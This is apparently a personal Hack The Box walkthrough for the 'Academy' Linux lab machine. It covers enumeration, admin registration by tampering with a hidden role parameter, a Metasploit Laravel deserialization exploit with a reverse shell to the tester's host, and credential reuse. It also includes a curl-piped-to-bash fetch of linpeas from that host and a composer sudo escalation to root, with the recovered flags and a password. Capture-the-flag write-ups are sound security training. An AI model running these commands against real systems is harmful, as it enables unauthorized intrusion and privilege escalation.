---
date: 2024-06-21
title: Academy HTB Write-Up
machine_ip: 10.10.10.215
os: Linux
difficulty: Easy
my_rating: 2
tags:
  - Web
  - Deserialization
  - Laravel
references: "[[📚CTF Box Writeups]]"
---
## Enumeration

Used to gather usernames, group names, hostnames, network shares and services, IP tables and routing tables, etc.

### Nmap

```
┌─(~/Documents/HTB_VPN)─────────────────────────────────────────────────────────────────────────────────────────────────────────────────(kali@kali:pts/2)─┐
└─(14:34:28)──> nmap -T4 -p- -A 10.10.10.215                ──(Fri,Jun21)─┘
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-21 14:34 PDT
Nmap scan report for academy.htb (10.10.10.215)
Host is up (0.097s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 c0:90:a3:d8:35:25:6f:fa:33:06:cf:80:13:a0:a5:53 (RSA)
|   256 2a:d5:4b:d0:46:f0:ed:c9:3c:8d:f6:5d:ab:ae:77:96 (ECDSA)
|_  256 e1:64:14:c3:cc:51:b2:3b:a6:28:a7:b1:ae:5f:45:35 (ED25519)
80/tcp    open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Hack The Box Academy
33060/tcp open  mysqlx?
| fingerprint-strings: 
|   DNSStatusRequestTCP, LDAPSearchReq, NotesRPC, SSLSessionReq, TLSSessionReq, X11Probe, afp: 
|     Invalid message"
|_    HY000
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port33060-TCP:V=7.94SVN%I=7%D=6/21%Time=6675F4A2%P=x86_64-pc-linux-gnu%
SF:r(NULL,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(GenericLines,9,"\x05\0\0\0\x
SF:0b\x08\x05\x1a\0")%r(GetRequest,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(HTT
SF:POptions,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(RTSPRequest,9,"\x05\0\0\0\
SF:x0b\x08\x05\x1a\0")%r(RPCCheck,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(DNSV
SF:ersionBindReqTCP,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(DNSStatusRequestTC
SF:P,2B,"\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x
SF:0fInvalid\x20message\"\x05HY000")%r(Help,9,"\x05\0\0\0\x0b\x08\x05\x1a\
SF:0")%r(SSLSessionReq,2B,"\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\
SF:x01\x10\x88'\x1a\x0fInvalid\x20message\"\x05HY000")%r(TerminalServerCoo
SF:kie,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(TLSSessionReq,2B,"\x05\0\0\0\x0
SF:b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20messag
SF:e\"\x05HY000")%r(Kerberos,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(SMBProgNe
SF:g,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(X11Probe,2B,"\x05\0\0\0\x0b\x08\x
SF:05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20message\"\x05
SF:HY000")%r(FourOhFourRequest,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(LPDStri
SF:ng,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(LDAPSearchReq,2B,"\x05\0\0\0\x0b                                  
SF:\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20message                                  
SF:\"\x05HY000")%r(LDAPBindReq,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(SIPOpti                                  
SF:ons,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(LANDesk-RC,9,"\x05\0\0\0\x0b\x0                                  
SF:8\x05\x1a\0")%r(TerminalServer,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(NCP,                                  
SF:9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(NotesRPC,2B,"\x05\0\0\0\x0b\x08\x05                                  
SF:\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20message\"\x05HY                                  
SF:000")%r(JavaRMI,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(WMSRequest,9,"\x05\                                  
SF:0\0\0\x0b\x08\x05\x1a\0")%r(oracle-tns,9,"\x05\0\0\0\x0b\x08\x05\x1a\0"                                  
SF:)%r(ms-sql-s,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(afp,2B,"\x05\0\0\0\x0b                                  
SF:\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20message                                  
SF:\"\x05HY000")%r(giop,9,"\x05\0\0\0\x0b\x08\x05\x1a\0");                                                  
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel                                                     
                                                                                                            
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .              
Nmap done: 1 IP address (1 host up) scanned in 720.36 seconds   
```
We find ports 22, 80, and 33060 ports open. Indicating a webserver and database available. Enumerating the directories with dirbuster is shown below.

![[Pasted image 20240621144427.png]]

We find an admin.php page.

![[Pasted image 20240621150108.png]]

The register.php page has a `roleid` hidden value in burpsuite. changing it to 1 allows us to create an admin account.

![[Pasted image 20240621150426.png]]

Successful login to the admin portal for academy.htb.

![[Pasted image 20240621150438.png]]

The admin portal shows a vhost. Navigating to it, we see that laravel is used and we can research that for exploits.

![[Pasted image 20240621150909.png]]

Environment variables including the `APP_KEY` and database, username, and passwords

![[Pasted image 20240621151231.png]]
## Exploitation

Search for exploits relating to laravel and use it.

```
msf6 > search laravel

Matching Modules
================

   #  Name                                              Disclosure Date  Rank       Check  Description
   -  ----                                              ---------------  ----       -----  -----------
   0  exploit/unix/http/laravel_token_unserialize_exec  2018-08-07       excellent  Yes    PHP Laravel Framework token Unserialize Remote Command Execution

```

```
msf6 > use 0
[*] Using configured payload cmd/unix/reverse_perl
msf6 exploit(unix/http/laravel_token_unserialize_exec) > show options

Module options (exploit/unix/http/laravel_token_unserialize_exec):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   APP_KEY                     no        The base64 encoded APP_KEY str
                                         ing from the .env file
   Proxies                     no        A proxy chain of format type:h
                                         ost:port[,type:host:port][...]
   RHOSTS                      yes       The target host(s), see https:
                                         //docs.metasploit.com/docs/usi
                                         ng-metasploit/basics/using-met
                                         asploit.html
   RPORT      80               yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing
                                          connections
   TARGETURI  /                yes       Path to target webapp
   VHOST                       no        HTTP server virtual host


Payload options (cmd/unix/reverse_perl):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface m
                                     ay be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic



View the full module info with the info, or info -d command.
```

We set the options based on the environment variables observed on the vhost.

```
msf6 exploit(unix/http/laravel_token_unserialize_exec) > set LHOST tun0
LHOST => 10.10.14.53
msf6 exploit(unix/http/laravel_token_unserialize_exec) > set APP_KEY dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0=
APP_KEY => dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0=
msf6 exploit(unix/http/laravel_token_unserialize_exec) > set RHOSTS dev-staging-01.academy.htb
RHOSTS => dev-staging-01.academy.htb
msf6 exploit(unix/http/laravel_token_unserialize_exec) > set VHOST dev-staging-01.academy.htb
VHOST => dev-staging-01.academy.htb
msf6 exploit(unix/http/laravel_token_unserialize_exec) > set PROXIES http:127.0.0.1:8080
PROXIES => http:127.0.0.1:8080
msf6 exploit(unix/http/laravel_token_unserialize_exec) > set LPORT 9001
LPORT => 9001
msf6 exploit(unix/http/laravel_token_unserialize_exec) > show options

Module options (exploit/unix/http/laravel_token_unserialize_exec):

   Name       Current Setting    Required  Description
   ----       ---------------    --------  -----------
   APP_KEY    dBLUaMuZz7Iq06XtL  no        The base64 encoded APP_KEY s
              /Xnz/90Ejq+DEEyng            tring from the .env file
              gqubHWFj0=
   Proxies    http:127.0.0.1:80  no        A proxy chain of format type
              80                           :host:port[,type:host:port][
                                           ...]
   RHOSTS     dev-staging-01.ac  yes       The target host(s), see http
              ademy.htb                    s://docs.metasploit.com/docs
                                           /using-metasploit/basics/usi
                                           ng-metasploit.html
   RPORT      80                 yes       The target port (TCP)
   SSL        false              no        Negotiate SSL/TLS for outgoi
                                           ng connections
   TARGETURI  /                  yes       Path to target webapp
   VHOST      dev-staging-01.ac  no        HTTP server virtual host
              ademy.htb


Payload options (cmd/unix/reverse_perl):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.10.14.53      yes       The listen address (an interface m
                                     ay be specified)
   LPORT  9001             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic



View the full module info with the info, or info -d command.
```

Exploit!

```
msf6 exploit(unix/http/laravel_token_unserialize_exec) > run

[-] 10.10.10.215:80 - Exploit failed: RuntimeError TCP connect-back payloads cannot be used with Proxies. Use 'set ReverseAllowProxy true' to override this behaviour.
[*] Exploit completed, but no session was created.
msf6 exploit(unix/http/laravel_token_unserialize_exec) > set ReverseAllowProxy true
ReverseAllowProxy => true
```

We caught a www-data shell!

```msf6 exploit(unix/http/laravel_token_unserialize_exec) > run

[*] Started reverse TCP handler on 10.10.14.53:9001 
[*] Command shell session 1 opened (10.10.14.53:9001 -> 10.10.10.215:49364) at 2024-06-21 15:17:59 -0700

[*] Command shell session 2 opened (10.10.14.53:9001 -> 10.10.10.215:49366) at 2024-06-21 15:18:00 -0700
[*] Command shell session 3 opened (10.10.14.53:9001 -> 10.10.10.215:49368) at 2024-06-21 15:18:01 -0700
[*] Command shell session 4 opened (10.10.14.53:9001 -> 10.10.10.215:49370) at 2024-06-21 15:18:02 -0700
ls
css
favicon.ico
index.php
js
robots.txt
web.config
whoami
www-data
```

Burpsuite shows a XSRF token that we can decrypt with CyberChef.

![[Pasted image 20240621152215.png]]

Decrypting base64 XSRF token:

```
┌─(~/Documents/HTB_VPN)──────────────────────────────(kali@kali:pts/2)─┐
└─(15:22:59)──> echo -n eyJpdiI6IlhtKzZjTloyUElzdm9jY09IMTJMSXc9PSIsInZhbHVlIjoiZEFacEZcL3FQSTBlMlcyZWpZaGU3R3BGVUpYU2xHSmdTZnQwRlRJR2VkS1lsMFh3RG1zbHRlaDNRVFJ1V2ZKb2Yzbm9QY3VzSWhoT3dMZXFkWlwvOTBcLzMyYzh2dTFhQjdiY3NscEVQZHE5U3Fua0ZUV09TbEIzWFVGeEJDN3YzN0E1SWxQbGFcL1lCR2RnT2hyazF2OWNvTmJPUitPajB6bW1FdVlLVHJjTktDZXZCaEl6OERWQ0ZUd0pIXC9IbDNzUWNzcndQRFhZQ2kwNmsxdk9cLzVtUjYxWVo3b002bHlHT1VvbmtOWGR6UVNySXA1aDZkVXZWSlNhRDNESDZGelgwT0tiWmdPbUVWazQ3R2g4WCsxQ0QxbzFxa2tiZ1VNa1JyeXJvTFFzczRGR1Z2eno2d1d1cHpxbVwvSVBqNXRHazhCZGxlYzRGRk4xRDZkYlpDT25zbjh3Rm5LZk05azFpblE0VTlxRmFZMllSN3Fpc1BxbUQ0MGplN09OcEZDbGFCSWJJYTlSZldpUytxdFNvMGgycjl6NGtCY01tRUhSZG5cL1RuYU1kTVBVMld5ZWNQNCtYRjFuSDF4dVU1emxjV0w4SjJQUVwvUTZmazlvR3BnT0xxeFJYVmlSUGR1RWJSRTdnaHVIMjFVYXpuckV2dDI2SjNIcjRCaGNaSEVYVmZmT2trUkVncnBJbFdTNUsxWWV1RVVtU2U0aVNia01YNjlTdjgwOUV0SW1MUWZVPSIsIm1hYyI6ImFkYWExMWM1NzhiNTczOWQwY2NkNmUyNTRkODFjODhlNDMzZDMwYzJkZGE4YmUzMzA2N2YzNDQ4YjQwZTIwODkifQ== | base64 -d
| sed 's/,/\r\n/g'
{"iv":"Xm+6cNZ2PIsvoccOH12LIw=="
"value":"dAZpF\/qPI0e2W2ejYhe7GpFUJXSlGJgSft0FTIGedKYl0XwDmslteh3QTRuWfJof3noPcusIhhOwLeqdZ\/90\/32c8vu1aB7bcslpEPdq9SqnkFTWOSlB3XUFxBC7v37A5IlPla\/YBGdgOhrk1v9coNbOR+Oj0zmmEuYKTrcNKCevBhIz8DVCFTwJH\/Hl3sQcsrwPDXYCi06k1vO\/5mR61YZ7oM6lyGOUonkNXdzQSrIp5h6dUvVJSaD3DH6FzX0OKbZgOmEVk47Gh8X+1CD1o1qkkbgUMkRryroLQss4FGVvzz6wWupzqm\/IPj5tGk8Bdlec4FFN1D6dbZCOnsn8wFnKfM9k1inQ4U9qFaY2YR7qisPqmD40je7ONpFClaBIbIa9RfWiS+qtSo0h2r9z4kBcMmEHRdn\/TnaMdMPU2WyecP4+XF1nH1xuU5zlcWL8J2PQ\/Q6fk9oGpgOLqxRXViRPduEbRE7ghuH21UaznrEvt26J3Hr4BhcZHEXVffOkkREgrpIlWS5K1YeuEUmSe4iSbkMX69Sv809EtImLQfU="
"mac":"adaa11c578b5739d0ccd6e254d81c88e433d30c2dda8be33067f3448b40e2089"}
```

Using CyberChef to decrypt the encryption from the `value` using the `APP_KEY` and `IV`.

![[Pasted image 20240621153325.png]]

Enumerating the www-data user. Config shows the database username and password
	
```
www-data@academy:/var/www/html/htb-academy-dev-01/config$ ls  
ls
app.php           cache.php        hashing.php  queue.php     view.php
auth.php          database.php     logging.php  services.php
broadcasting.php  filesystems.php  mail.php     session.php
www-data@academy:/var/www/html/htb-academy-dev-01/config$ cat database.op 
cat databa
cat: databa: No such file or directory
www-data@academy:/var/www/html/htb-academy-dev-01/config$ cat database.php
cat database.php
<?php

return [

    /*
    |--------------------------------------------------------------------------
    | Default Database Connection Name
    |--------------------------------------------------------------------------
    |
    | Here you may specify which of the database connections below you wish
    | to use as your default connection for all database work. Of course
    | you may use many connections at once using the Database library.
    |
    */

    'default' => env('DB_CONNECTION', 'mysql'),

    /*
    |--------------------------------------------------------------------------
    | Database Connections
    |--------------------------------------------------------------------------
    |
    | Here are each of the database connections setup for your application.
    | Of course, examples of configuring each database platform that is
    | supported by Laravel is shown below to make development simple.
    |
    |
    | All database work in Laravel is done through the PHP PDO facilities
    | so make sure you have the driver for your particular database of
    | choice installed on your machine before you begin development.
    |
    */

    'connections' => [

        'sqlite' => [
            'driver' => 'sqlite',
            'database' => env('DB_DATABASE', database_path('database.sqlite')),
            'prefix' => '',
        ],

        'mysql' => [
            'driver' => 'mysql',
            'host' => env('DB_HOST', '127.0.0.1'),
            'port' => env('DB_PORT', '3306'),
            'database' => env('DB_DATABASE', 'forge'),
            'username' => env('DB_USERNAME', 'forge'),
            'password' => env('DB_PASSWORD', ''),
            'unix_socket' => env('DB_SOCKET', ''),
            'charset' => 'utf8mb4',
            'collation' => 'utf8mb4_unicode_ci',
            'prefix' => '',
            'strict' => true,
            'engine' => null,
        ],

        'pgsql' => [
            'driver' => 'pgsql',
            'host' => env('DB_HOST', '127.0.0.1'),
            'port' => env('DB_PORT', '5432'),
            'database' => env('DB_DATABASE', 'forge'),
            'username' => env('DB_USERNAME', 'forge'),
            'password' => env('DB_PASSWORD', ''),
            'charset' => 'utf8',
            'prefix' => '',
            'schema' => 'public',
            'sslmode' => 'prefer',
        ],

        'sqlsrv' => [
            'driver' => 'sqlsrv',
            'host' => env('DB_HOST', 'localhost'),
            'port' => env('DB_PORT', '1433'),
            'database' => env('DB_DATABASE', 'forge'),
            'username' => env('DB_USERNAME', 'forge'),
            'password' => env('DB_PASSWORD', ''),
            'charset' => 'utf8',
            'prefix' => '',
        ],

    ],
```

Unsuccessful in logging in using MySQL.

![[Pasted image 20240621154904.png]]

Observed a new database password in the `.env` file containing environment variables. We ssh to a user found in the home directory using this password:

```
┌─(~/Documents/Boxes/Academy)────────────────────────(kali@kali:pts/2)─┐
└─(15:50:33)──> ssh cry0l1t3@academy.htb             2 ↵ ──(Fri,Jun21)─┘
The authenticity of host 'academy.htb (10.10.10.215)' can't be established.
ED25519 key fingerprint is SHA256:hnOe1bcUjO7e/OQwjb79pf4GATiO1ov1U37KOPCkBdE.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'academy.htb' (ED25519) to the list of known hosts.
cry0l1t3@academy.htb's password: 
Welcome to Ubuntu 20.04.1 LTS (GNU/Linux 5.4.0-52-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Fri 21 Jun 2024 10:51:24 PM UTC

  System load:             0.08
  Usage of /:              45.3% of 15.68GB
  Memory usage:            18%
  Swap usage:              0%
  Processes:               181
  Users logged in:         0
  IPv4 address for ens160: 10.10.10.215
  IPv6 address for ens160: dead:beef::250:56ff:feb0:665e

 * Introducing self-healing high availability clustering for MicroK8s!
   Super simple, hardened and opinionated Kubernetes for production.

     https://microk8s.io/high-availability

0 updates can be installed immediately.
0 of these updates are security updates.


Last login: Wed Aug 12 21:58:45 2020 from 10.10.14.2
$ whoami
cry0l1t3
```

Successful ssh and found user.txt!

```
$ ls
user.txt
$ cat user.txt
e73435ac00c2ca53a22240318c865651
```

## Priv Esc

Check sudo permissions

```
$ sudo -l
[sudo] password for cry0l1t3: 

Sorry, try again.
[sudo] password for cry0l1t3: 
Sorry, try again.
[sudo] password for cry0l1t3: 
Sorry, user cry0l1t3 may not run sudo on academy.
```

No sudo permissions, lets run linpeas:

```
┌─(~/Documents/Boxes/Academy/www)────────────────────(kali@kali:pts/5)─┐
└─(16:00:34)──> python3 -m http.server                   ──(Fri,Jun21)─┘
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.10.215 - - [21/Jun/2024 16:02:26] "GET /linpeas.sh HTTP/1.1" 200 -
                                                                         
        
```

```
$ curl 10.10.14.53:8000/linpeas.sh | bash
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0

                            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
                    ▄▄▄▄▄▄▄             ▄▄▄▄▄▄▄▄
             ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄
         ▄▄▄▄     ▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄
         ▄    ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄          ▄▄▄▄▄▄               ▄▄▄▄▄▄ ▄
         ▄▄▄▄▄▄              ▄▄▄▄▄▄▄▄                 ▄▄▄▄ 
         ▄▄                  ▄▄▄ ▄▄▄▄▄                  ▄▄▄
         ▄▄                ▄▄▄▄▄▄▄▄▄▄▄▄                  ▄▄
         ▄            ▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄   ▄▄
         ▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄                                ▄▄▄▄
         ▄▄▄▄▄  ▄▄▄▄▄                       ▄▄▄▄▄▄     ▄▄▄▄
         ▄▄▄▄   ▄▄▄▄▄                       ▄▄▄▄▄      ▄ ▄▄
         ▄▄▄▄▄  ▄▄▄▄▄        ▄▄▄▄▄▄▄        ▄▄▄▄▄     ▄▄▄▄▄
         ▄▄▄▄▄▄  ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄   ▄▄▄▄▄ 
          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄        ▄          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ 
         ▄▄▄▄▄▄▄▄▄▄▄▄▄                       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄                         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
          ▀▀▄▄▄   ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▀▀▀▀▀▀
               ▀▀▀▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▀▀
                     ▀▀▀▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▀▀▀

    /---------------------------------------------------------------------------------\                                                           
    |                             Do you like PEASS?                                  |                                                           
    |---------------------------------------------------------------------------------|                                                           
    |         Follow on Twitter         :     @hacktricks_live                        |                                                           
    |         Respect on HTB            :     SirBroccoli                             |                                                           
    |---------------------------------------------------------------------------------|                                                           
    |                                 Thank you!                                      |                                                           
    \---------------------------------------------------------------------------------/                                                           
          linpeas-ng by github.com/PEASS-ng                              
                                                                         
ADVISORY: This script should be used for authorized penetration testing and/or educational purposes only. Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own computers and/or with the computer owner's permission.          
                                                                         
Linux Privesc Checklist: https://book.hacktricks.xyz/linux-hardening/linux-privilege-escalation-checklist                                         
 LEGEND:                                                                 
  RED/YELLOW: 95% a PE vector
  RED: You should take a look to it
  LightCyan: Users with console
  Blue: Users without console & mounted devs
  Green: Common things (users, groups, SUID/SGID, mounts, .sh scripts, cronjobs) 
  LightMagenta: Your username

 Starting linpeas. Caching Writable Folders...

...SNIP...

╔══════════╣ Checking Pkexec policy
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe#pe-method-2                                        
                                                                         
[Configuration]
AdminIdentities=unix-user:0
[Configuration]
AdminIdentities=unix-group:sudo;unix-group:admin

╔══════════╣ Superusers
root:x:0:0:root:/root:/bin/bash                                          

╔══════════╣ Users with console
21y4d:x:1003:1003::/home/21y4d:/bin/sh                                   
ch4p:x:1004:1004::/home/ch4p:/bin/sh
cry0l1t3:x:1002:1002::/home/cry0l1t3:/bin/sh
egre55:x:1000:1000:egre55:/home/egre55:/bin/bash
g0blin:x:1005:1005::/home/g0blin:/bin/sh
mrb3n:x:1001:1001::/home/mrb3n:/bin/sh
root:x:0:0:root:/root:/bin/bash

╔══════════╣ All users & groups
uid=0(root) gid=0(root) groups=0(root)                                   
uid=1000(egre55) gid=1000(egre55) groups=1000(egre55),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lxd)                                      
uid=1001(mrb3n) gid=1001(mrb3n) groups=1001(mrb3n)
uid=1002(cry0l1t3) gid=1002(cry0l1t3) groups=1002(cry0l1t3),4(adm)

...SNIP...
```

Found that the user is a part of the `adm` group that is a `AdminIdentities`

We use aureport to see the shell sessions from the audit log:

```
$ aureport --tty

TTY Report
===============================================
# date time event auid term sess comm data
===============================================
Error opening config file (Permission denied)
NOTE - using built-in logs: /var/log/audit/audit.log
1. 08/12/2020 02:28:10 83 0 ? 1 sh "su mrb3n",<nl>
2. 08/12/2020 02:28:13 84 0 ? 1 su "mrb3n_Ac@d3my!",<nl>
```

We see a mrb3n logged in and can see his password.

```
$ su mrb3n
Password: 
$ whoami
mrb3n
```

We successfully login as mrb3n and check his sudo permissions.

```
mrb3n@academy:~$ sudo -l
[sudo] password for mrb3n: 
Matching Defaults entries for mrb3n on academy:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User mrb3n may run the following commands on academy:
    (ALL) /usr/bin/composer

```

He can run composer as sudo. Checking GTFOBins, we find a way to escalate privileges using that binary.

![[Pasted image 20240621162132.png]]

Running the commands:

```
mrb3n@academy:~$ TF=$(mktemp -d)
mrb3n@academy:~$ echo '{"scripts":{"x":"/bin/sh -i 0<&3 1>&3 2>&3"}}' >$TF/composer.json
mrb3n@academy:~$ sudo composer --working-dir=$TF run-script x
PHP Warning:  PHP Startup: Unable to load dynamic library 'mysqli.so' (tried: /usr/lib/php/20190902/mysqli.so (/usr/lib/php/20190902/mysqli.so: undefined symbol: mysqlnd_global_stats), /usr/lib/php/20190902/mysqli.so.so (/usr/lib/php/20190902/mysqli.so.so: cannot open shared object file: No such file or directory)) in Unknown on line 0
PHP Warning:  PHP Startup: Unable to load dynamic library 'pdo_mysql.so' (tried: /usr/lib/php/20190902/pdo_mysql.so (/usr/lib/php/20190902/pdo_mysql.so: undefined symbol: mysqlnd_allocator), /usr/lib/php/20190902/pdo_mysql.so.so (/usr/lib/php/20190902/pdo_mysql.so.so: cannot open shared object file: No such file or directory)) in Unknown on line 0
Do not run Composer as root/super user! See https://getcomposer.org/root for details
> /bin/sh -i 0<&3 1>&3 2>&3
# whoami
root
```

Success! We got access to root and found root.txt!

```
# cat root.txt
b1177d9d46f039eb247ccd2561b91152
```
